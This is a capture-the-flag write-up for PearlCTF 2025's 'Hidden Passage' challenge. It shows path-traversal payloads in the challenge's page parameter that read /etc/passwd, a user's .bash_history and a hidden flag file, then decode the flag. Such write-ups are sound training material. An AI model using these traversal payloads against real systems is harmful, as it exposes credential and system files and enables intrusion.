# pearlctf-2025_hiddenpassage__solve

# Solve Writeup - Hidden Passage

## **Challenge Description**

APD messed up while setting up the system—now files are leaking! Can you help uncover the hidden secrets?

---

## **Solution**

### **Step 1: Discovering the LFI Vulnerability**

Upon visiting the challenge URL, inspecting the page source will reveal a hint:

```
Strange how everyone leaves a hint.txt when setting up a new profile... Maybe it's worth a look?
```

This suggests that there might be interesting files left behind.

```
WARNING: Sensitive user credentials are stored in 'passwd'. Do NOT share.
```

This strongly hints at an LFI (Local File Inclusion) vulnerability. Testing with a common LFI payload:

```
http://hidden-passage.ctf.pearlctf.in:30013/index.php?page=../../../../etc/passwd
```

Will successfully leak the system's `/etc/passwd` file, confirming the vulnerability.

---

### **Step 2: Finding the Next Clue**

In the `/etc/passwd` output, you will notice the presence of a user `lfi-user`. Attempting to access their home directory:

```
http://hidden-passage.ctf.pearlctf.in:30013/index.php?page=../../../../home/lfi-user/hint.txt
```

Will reveal the content:

```
The past holds secrets... People often retrace their steps to find what was lost.
```

This hints at looking into `.bash_history`, where previous commands might give more information.

```
http://hidden-passage.ctf.pearlctf.in:30013/index.php?page=../../../../home/lfi-user/.bash_history
```

Will show:

```
cat /var/www/html/page/dev_notes.txt
ls /var/www/html/page/
```

---

### **Step 3: Searching for Hidden Files**

Accessing `dev_notes.txt`:

```
http://hidden-passage.ctf.pearlctf.in:30013/index.php?page=dev_notes.txt
```

Contains:

```
The real prize isn’t here... It might be "hidden" in the shadows, just a few steps **behind** where you are looking.
Only the curious will uncover the "flag".
```

The second line suggests that the flag is inside a file named `flag`.

This suggests that the flag is stored somewhere outside the usual `/var/www/html/page/` directory.

---

### **Step 4: Finding the Hidden Flag**

The clue from `dev_notes.txt` states that the real prize is "hidden" and "a few steps behind." This suggests looking in directories that may not be immediately visible. Since the web directory is `/var/www/html/`, going back (`../`) and checking `/var/www/` for hidden locations is a logical next step.

Testing further:

```
http://hidden-passage.ctf.pearlctf.in:30013/index.php?page=../../../../var/www/hidden/flag.php
```
This aligns with the clue about "shadows" and "hidden." 

Reveals:

```
95GMpVTdMNjbJ9VZMFjZfxGNjBDb7xmchVGc
```

At this point, looking at the challenge screen, you will notice that the title at the top is reversed:

**"?GALF EHT DNIF UOY NAC"**

This suggests that the flag is reversed. Reversing the leaked string:

```python
encoded_string = "95GMpVTdMNjbJ9VZMFjZfxGNjBDb7xmchVGc"
reversed_string = encoded_string[::-1]
print(reversed_string)
```

Will give:

```
cGVhcmx7bDBjNGxfZjFMZV9JbjNMdTVpMG59
```

Decoding from Base64:

```
pearl{l0c4l_f1Le_In3Lu5i0n}
```

---

## **Flag:**

```
pearl{l0c4l_f1Le_In3Lu5i0n}
```

---

